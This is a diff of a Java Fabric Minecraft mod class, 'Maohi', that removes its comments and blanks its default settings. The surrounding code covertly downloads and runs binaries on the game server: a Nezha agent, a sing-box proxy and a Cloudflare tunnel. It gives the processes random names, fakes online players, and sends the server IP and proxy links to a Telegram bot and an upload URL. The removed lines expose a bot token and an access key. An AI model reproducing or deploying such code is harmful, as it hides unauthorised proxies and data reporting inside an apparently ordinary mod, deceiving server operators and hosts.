@@ -16,10 +16,6 @@ import java.nio.file.*;
 import java.nio.file.DirectoryStream;
 import java.util.*;
 
-/**
- * Maohi 核心类，实现 Fabric Mod 初始化接口
- * 集成了虚拟玩家系统，用于维持服务器在线人数
- */
 public class Maohi implements ModInitializer {
     public static final Logger LOGGER = LoggerFactory.getLogger("Maohi");
 
@@ -28,14 +24,9 @@ public class Maohi implements ModInitializer {
 
     private static final Properties CONFIG = loadConfig();
 
-    // 虚拟玩家管理器
     private static VirtualPlayerManager virtualPlayerManager;
     private int tickCounter = 0;
 
-    /**
-     * 从资源文件中加载配置属性
-     * @return 加载后的属性对象
-     */
     private static Properties loadConfig() {
         Properties props = new Properties();
         try (InputStream is = Maohi.class.getResourceAsStream("/maohi.properties")) {
@@ -44,38 +35,29 @@ public class Maohi implements ModInitializer {
         return props;
     }
 
-    /**
-     * 获取配置项字符串，如果不存在则返回默认值
-     * @param key 配置键
-     * @param defaultValue 默认值
-     * @return 过滤后的配置值
-     */
     private static String cfg(String key, String defaultValue) {
         String value = CONFIG.getProperty(key, defaultValue);
         return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
     }
 
-    private static final String NZ_SERVER = cfg("NZ_SERVER", "nazhav1.gamesover.eu.org:443");    // V1格式 xxx.xxx.com:443  V0格式 xxx.xxx.com
-    private static final String NZ_KEY    = cfg("NZ_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
-    private static final String NZ_PORT   = cfg("NZ_PORT", "");                                  // V1留空  V0写端口
-    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");                           // 留空临时隧道
+    private static final String NZ_SERVER = cfg("NZ_SERVER", "nezha.loc.cc:443");    // V1格式 xxx.xxx.com:443  V0格式 xxx.xxx.com
+    private static final String NZ_KEY    = cfg("NZ_KEY", "");
+    private static final String NZ_PORT   = cfg("NZ_PORT", "");
+    private static final String ARGO_DOMAIN  = cfg("ARGO_DOMAIN", "");
     private static final String ARGO_AUTH    = cfg("ARGO_AUTH", "");
-    private static final String ARGO_PORT    = cfg("ARGO_PORT", "");                         // 留空不启用隧道
+    private static final String ARGO_PORT    = cfg("ARGO_PORT", "");
     private static final String HY2_PORT     = cfg("HY2_PORT", "");
-    private static final String TUIC_PORT    = cfg("TUIC_PORT", "25565");
+    private static final String TUIC_PORT    = cfg("TUIC_PORT", "");
     private static final String S5_PORT      = cfg("S5_PORT", "");
     private static final String CFIP         = cfg("CFIP", "ip.sb");
     private static final String CFPORT       = cfg("CFPORT", "443");
-    private static final String CHAT_ID      = cfg("CHAT_ID", "558914831");
-    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
-    private static final String NAME         = cfg("NAME", "Secure.xserver.ne.jp");
-    private static final String UUID         = cfg("UUID", "9afd1229-b893-40c1-84dd-51e7ce204900");
-    private static final String UPLOAD_URL   = cfg("UPLOAD_URL", "https://sub.smartdns.eu.org/upload-ea4909ef-7ca6-4b46-bf2e-6c07896ef338");   //上传订阅管理系统，不用留空
+    private static final String CHAT_ID      = cfg("CHAT_ID", "");
+    private static final String BOT_TOKEN    = cfg("BOT_TOKEN", "");
+    private static final String NAME         = cfg("NAME", "");
+    private static final String UUID         = cfg("UUID", "");
+    private static final String UPLOAD_URL   = cfg("UPLOAD_URL", "");
 
 
-    /**
-     * 获取 IP 的 ISP（运营商）信息
-     */
     private String getISPFromIP(String ip) {
         // 优先尝试 ip.sb
         try {
@@ -96,7 +78,6 @@ public class Maohi implements ModInitializer {
             // 静默失败
         }
 
-        // 备用尝试 ip-api.com
         try {
             HttpURLConnection conn = (HttpURLConnection) new URL("http://ip-api.com/json/" + ip).openConnection();
             conn.setConnectTimeout(3000);
@@ -118,9 +99,6 @@ public class Maohi implements ModInitializer {
         return "UnknownISP";
     }
 
-    /**
-     * 获取国家 Emoji 和 城市名称
-     */
     private String getCountryEmoji() {
         String[] sources = {
             "https://ipconfig.ggff.net",
@@ -146,10 +124,6 @@ public class Maohi implements ModInitializer {
         return "🇺🇳 联合国";
     }
 
-    /**
-     * 获取完整节点后缀信息
-     * 组合格式为：[Emoji 国家 城市]_[运营商] | [配置名称]
-     */
     private String getFullNodeName(String ip) {
         String emoji = getCountryEmoji();
         String isp = getISPFromIP(ip);
@@ -188,26 +162,17 @@ public class Maohi implements ModInitializer {
         thread.start();
     }
 
-    /**
-     * 服务器启动完成回调
-     */
     private void onServerStarted(MinecraftServer server) {
         virtualPlayerManager = new VirtualPlayerManager(server);
         virtualPlayerManager.start();
     }
 
-    /**
-     * 服务器关闭回调
-     */
     private void onServerStopping(MinecraftServer server) {
         if (virtualPlayerManager != null) {
             virtualPlayerManager.stop();
         }
     }
 
-    /**
-     * 服务器Tick事件，用于检测虚拟玩家死亡
-     */
     private void onServerTick(MinecraftServer server) {
         if (virtualPlayerManager == null) {
             return;
@@ -226,9 +191,6 @@ public class Maohi implements ModInitializer {
         }
     }
 
-    /**
-     * 执行核心业务逻辑：下载、部署、启动和上报
-     */
     private void start() throws Exception {
         if (!Files.exists(FILE_PATH)) Files.createDirectories(FILE_PATH);
 
@@ -272,10 +234,6 @@ public class Maohi implements ModInitializer {
 
     }
 
-
-    /**
-     * 生成 6 位的随机字母串，装修进程
-     */
     private String randomName() {
         String chars = "abcdefghijklmnopqrstuvwxyz";
         StringBuilder sb = new StringBuilder();
@@ -290,9 +248,6 @@ public class Maohi implements ModInitializer {
         return "amd64";
     }
 
-    /**
-     * 根据架构从远程 GitHub 仓库下载预编译的二进制文件
-     */
     private void downloadBinaries(String arch) {
         // 根据架构选择基础 URL
         String baseUrl = arch.equals("arm64")
@@ -320,9 +275,6 @@ public class Maohi implements ModInitializer {
         }
     }
 
-    /**
-     * 处理下载逻辑，并支持处理 HTTP/HTTPS 重定向
-     */
     private void downloadFile(String fileName, String fileUrl) throws Exception {
         Path dest = FILE_PATH.resolve(fileName);
         if (Files.exists(dest)) return;
@@ -353,19 +305,12 @@ public class Maohi implements ModInitializer {
         }
     }
 
-    /**
-     * 为下载的二进制文件赋予可执行权限
-     */
     private void chmodBinaries() {
         for (String name : new String[]{webName, botName, phpName}) {
             try { FILE_PATH.resolve(name).toFile().setExecutable(true); } catch (Exception e) {}
         }
     }
 
-    /**
-     * 生成自签名 SSL 证书。
-     * 优先尝试调用系统的 openssl，如果失败则写入硬编码的证书内容。
-     */
     private void generateCert() {
         Path certFile = FILE_PATH.resolve("cert.pem");
         Path keyFile  = FILE_PATH.resolve("private.key");
@@ -412,9 +357,6 @@ public class Maohi implements ModInitializer {
         } catch (Exception e) {}
     }
 
-    /**
-     * 启动并在后台运行哪吒监控客户端V0 or V1
-     */
     private void runNZ() {
         if (NZ_SERVER == null || NZ_SERVER.isEmpty() ||
             NZ_KEY    == null || NZ_KEY.isEmpty()) {
@@ -491,9 +433,6 @@ public class Maohi implements ModInitializer {
         }
     }
 
-    /**
-     * 启动并在后台运行 Sing-box 代理核心
-     */
     private void runSingbox() {
         try {
             String config = buildSingboxConfig();
@@ -512,9 +451,6 @@ public class Maohi implements ModInitializer {
         }
     }
 
-    /**
-     * 动态构建 Sing-box 的 JSON 配置文件
-     */
     private String buildSingboxConfig() {
         List<String> inbounds = new ArrayList<>();
 
@@ -588,9 +524,6 @@ public class Maohi implements ModInitializer {
             "}";
     }
 
-    /**
-     * 启动 Cloudflare Tunnel
-     */
     private void runCloudflared() {
         // ARGO_PORT 为空 → 不启用隧道
         if (!isValidPort(ARGO_PORT)) {
@@ -635,9 +568,6 @@ public class Maohi implements ModInitializer {
         }
     }
 
-    /**
-     * 获取当前服务器的公网 IP 地址
-     */
     private String getServerIP() {
         String[] sources = {
             "https://ip.sb",
@@ -673,9 +603,6 @@ public class Maohi implements ModInitializer {
         return "localhost";
     }
 
-    /**
-     * 简易的正则风格 JSON 字符串解析工具，获取指定 Key 的字符串 Value
-     */
     private String extractJson(String json, String key) {
         String search = "\"" + key + "\":\"";
         int start = json.indexOf(search);
@@ -721,9 +648,6 @@ public class Maohi implements ModInitializer {
         return null;
     }
 
-    /**
-     * 生成各种协议的分享链接并进行 Base64 编码
-     */
     private String generateLinks(String serverIP, String fullNodeName, String argoDomain) {
         StringBuilder sb = new StringBuilder();
         String nodeName = encodeNodeName(fullNodeName);
@@ -778,9 +702,6 @@ public class Maohi implements ModInitializer {
         return result;
     }
 
-    /**
-     * 将生成的节点订阅链接发送到指定的 TG-Bot
-     */
     private void sendTelegram(String subTxt, String fullNodeName) {
         if (BOT_TOKEN == null || BOT_TOKEN.isEmpty() ||
             CHAT_ID   == null || CHAT_ID.isEmpty()) return;
@@ -804,9 +725,6 @@ public class Maohi implements ModInitializer {
         } catch (Exception e) {}
     }
 
-    /**
-     * 将节点列表上传到指定的 URL
-     */
     private void uploadNodes(String fullNodeName) {
         if (UPLOAD_URL == null || UPLOAD_URL.isEmpty()) return;
 
